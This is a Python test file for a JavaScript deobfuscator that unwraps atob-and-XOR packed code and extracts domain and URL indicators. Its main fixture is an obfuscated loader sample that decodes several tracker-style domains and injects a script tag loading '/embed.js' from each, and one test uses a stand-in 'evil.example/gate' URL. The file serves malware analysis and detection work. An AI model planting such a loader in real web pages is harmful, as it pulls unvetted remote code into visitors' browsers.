from evilbox.decode import pick_repeating_xor_text, repeating_xor_text
from evilbox.pipeline import deobfuscate
from evilbox.unwrap import unwrap_js_atob_xor

USER_BLOB = (
    "CxJMCBBcF1cXFFkbCANKCgYCUQoGBUxWDAhUEQ0DRBAXEkgLWUkXGwILSBkKAVYMEQdbEwYU"
    "FhEAE0QQFxJIC1lJFxsCC0gZCgFWDBEHWxMGFBYKFghEEBcSSAtZSRcbAgtIGQoBVgwRB1sT"
    "BhQWDAwW"
)
USER_KEY = "cf8x"
USER_URLS = [
    "https://trackerredirect.online",
    "https://campaigntracker.icu",
    "https://campaigntracker.run",
    "https://campaigntracker.top",
]
USER_SAMPLE = (
    "(function(){var O=(function(b,k){var r=\"\",x=atob(b);for(var i=0;i<x.length;i++)"
    "r+=String.fromCharCode(x.charCodeAt(i)^k.charCodeAt(i%k.length));return r.split(\"|\")})"
    f'("{USER_BLOB}","{USER_KEY}"),i=0;function saveT(){{var r=document.documentElement,'
    't=document.querySelector("title"),v=(t&&t.textContent?t.textContent:document.title||"").trim();'
    "if(v&&!r.dataset.cfOriginalTitle)r.dataset.cfOriginalTitle=v;}saveT();function R(){"
    'document.documentElement.classList.add("cf-on");}document.documentElement.classList.add("cf-wait");'
    "function load(){if(i>=O.length){R();return;}var s=document.createElement(\"script\");"
    's.src=O[i]+"/embed.js?v=24";s.setAttribute("data-path","/");s.onerror=function(){i++;load();};'
    "document.head.appendChild(s);}setTimeout(function(){if(!window.__cfBoot)R();},12000);load();})();"
)


def test_repeating_xor_text_user_blob():
    text = repeating_xor_text(USER_BLOB, USER_KEY, use_atob=True)
    assert text == "|".join(USER_URLS)
    assert pick_repeating_xor_text(USER_KEY, USER_BLOB, use_atob=True) == text


def test_js_atob_xor_iife_user_sample():
    result = deobfuscate(USER_SAMPLE, language="js")
    for url in USER_URLS:
        assert url in result.text
    assert USER_BLOB not in result.text
    assert "trackerredirect.online" in result.indicators.domains
    assert "campaigntracker.icu" in result.indicators.domains
    assert "campaigntracker.run" in result.indicators.domains
    assert "campaigntracker.top" in result.indicators.domains
    assert any("trackerredirect.online" in url for url in result.indicators.urls)
    assert any("Unwrapped" in warning and "XOR" in warning for warning in result.warnings)
    assert "atob-xor-iife" in result.packer
    assert "/embed.js?v=24" in result.text


def test_js_atob_xor_iife_nested_braces():
    src = (
        "(function(b, k) {\n"
        '  var r = "", x = atob(b);\n'
        "  for (var i = 0; i < x.length; i++) {\n"
        "    r += String.fromCharCode(x.charCodeAt(i) ^ k.charCodeAt(i % k.length));\n"
        "  }\n"
        '  return r.split("|");\n'
        f'}})("{USER_BLOB}", "{USER_KEY}")'
    )
    result = deobfuscate(src, language="js")
    for url in USER_URLS:
        assert url in result.text


def test_js_atob_xor_swapped_params():
    src = (
        "(function(k,b){var r=\"\",x=atob(b);for(var i=0;i<x.length;i++)"
        "r+=String.fromCharCode(x.charCodeAt(i)^k.charCodeAt(i%k.length));"
        f'return r.split("|")}})("{USER_KEY}","{USER_BLOB}")'
    )
    result = deobfuscate(src, language="js")
    for url in USER_URLS:
        assert url in result.text


def test_js_repeating_xor_iife_without_atob():
    plain = "https://evil.example/gate"
    key = "k3y"
    xored = bytes(byte ^ key.encode()[i % len(key)] for i, byte in enumerate(plain.encode()))
    escaped = "".join(f"\\x{byte:02x}" for byte in xored)
    src = (
        "(function(b,k){var r=\"\";for(var i=0;i<b.length;i++)"
        "r+=String.fromCharCode(b.charCodeAt(i)^k.charCodeAt(i%k.length));return r;})"
        f'("{escaped}","{key}")'
    )
    result = deobfuscate(src, language="js")
    assert "https://evil.example/gate" in result.text
    assert "evil.example" in result.indicators.domains


def test_unwrap_js_atob_xor_direct():
    text, notes = unwrap_js_atob_xor(USER_SAMPLE)
    assert notes
    for url in USER_URLS:
        assert url in text
    assert USER_BLOB not in text


def _pipe_xor_iife(body: str, *, arrow: bool = False) -> str:
    call = f'("{USER_BLOB}","{USER_KEY}")'
    if arrow:
        return "((b,k)=>{" + body + "})" + call
    return "(function(b,k){" + body + "})" + call


_XOR_LOOP = (
    'var r="",x=atob(b);for(var i=0;i<x.length;i++)'
    "r+=String.fromCharCode(x.charCodeAt(i)^k.charCodeAt(i%k.length));"
)


def test_xor_iife_returned_split_ignores_earlier_splits():
    """A key or decoy split must not crash the decode or choose the separator."""
    body = 'var decoy="a,b".split(",");var chars=k.split("");' + _XOR_LOOP + 'return r.split("|");'
    src = (
        "var O="
        + _pipe_xor_iife(body)
        + ";"
        + f'if (O[0] === "{USER_URLS[0]}") {{ liveCall(); }} else {{ decoyCall(); }}'
    )
    result = deobfuscate(src, language="js")
    assert "liveCall" in result.text
    assert "decoyCall" not in result.text
    for url in USER_URLS:
        assert f'"{url}"' in result.text
    assert "|https://" not in result.text


def test_arrow_xor_iife_returned_split_ignores_key_split():
    body = 'var chars=k.split("");' + _XOR_LOOP + 'return r.split("|");'
    src = (
        "var O="
        + _pipe_xor_iife(body, arrow=True)
        + ";"
        + f'if (O[0] === "{USER_URLS[0]}") {{ liveCall(); }} else {{ decoyCall(); }}'
    )
    result = deobfuscate(src, language="js")
    assert "liveCall" in result.text
    assert "decoyCall" not in result.text
    for url in USER_URLS:
        assert f'"{url}"' in result.text


def test_xor_iife_unescapes_hex_split_separator():
    src = _pipe_xor_iife(_XOR_LOOP + 'return r.split("\\x7c");')
    result = deobfuscate(src, language="js")
    for url in USER_URLS:
        assert f'"{url}"' in result.text
    assert "|https://" not in result.text


def test_xor_iife_empty_result_split_does_not_crash():
    src = _pipe_xor_iife(_XOR_LOOP + 'return r.split("");')
    result = deobfuscate(src, language="js")
    assert '"h"' in result.text
    assert '"|"' in result.text
    assert '"https://trackerredirect.online"' not in result.text


def test_xor_iife_key_split_does_not_split_payload():
    body = (
        'var chars=k.split("");var r="",x=atob(b);for(var i=0;i<x.length;i++)'
        "r+=String.fromCharCode(x.charCodeAt(i)^chars[i%chars.length].charCodeAt(0));"
        "return r;"
    )
    result = deobfuscate(_pipe_xor_iife(body), language="js")
    joined = "|".join(USER_URLS)
    assert joined in result.text
    assert '"h"' not in result.text


def test_js_xor_iife_skips_rc4_percent_256():
    src = (
        "(function(b,k){var r=\"\",n=k.charCodeAt(0)%256;"
        "r+=String.fromCharCode(b.charCodeAt(0)^n);return r;})(\"QQ==\",\"k3\");"
    )
    result = deobfuscate(src, language="js")
    assert "QQ==" in result.text or "% 256" in result.text or "charCodeAt" in result.text
